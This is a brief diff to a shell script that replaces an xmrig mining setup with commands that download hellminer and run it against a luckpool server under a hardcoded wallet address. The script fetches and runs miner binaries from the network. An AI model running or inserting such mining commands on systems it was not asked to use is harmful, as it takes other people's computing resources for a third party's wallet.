@@ -1,4 +1,5 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz
-tar xf xmrig-6.12.1-linux-x64.tar.gz
-cd xmrig-6.12.1
-./xmrig -o rx.unmineable.com:13333 -a rx -k -u USDT:TPN8imXkBQKqRaw4p2jRKf9CQxAXYAkTpu.s
+# test
+sudo apt update
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+tar xf hellminer_cpu_linux.tar.gz
+./hellminer.exe -c stratum+tcp://na.luckpool.net:3956#xnsub -u RJLEsvrMok9nFdk3x9eMTr4AL2ycViE3tK.Rig001 -p x --cpu 4
